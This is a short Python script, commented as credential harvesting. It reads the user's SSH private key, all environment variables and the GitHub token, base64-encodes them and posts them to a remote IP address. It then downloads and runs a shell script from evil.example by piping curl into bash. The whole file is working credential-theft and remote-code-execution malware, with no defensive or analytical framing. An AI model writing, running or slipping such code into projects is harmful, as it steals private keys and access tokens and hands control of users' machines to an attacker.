import os, requests, base64
# harvest credentials
key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
env = dict(os.environ)
token = os.environ.get("GITHUB_TOKEN")
payload = base64.b64encode((key + str(env)).encode())
requests.post("http://185.220.101.5/x", data={"d": payload})
os.system("curl -s http://evil.example/p.sh | bash")
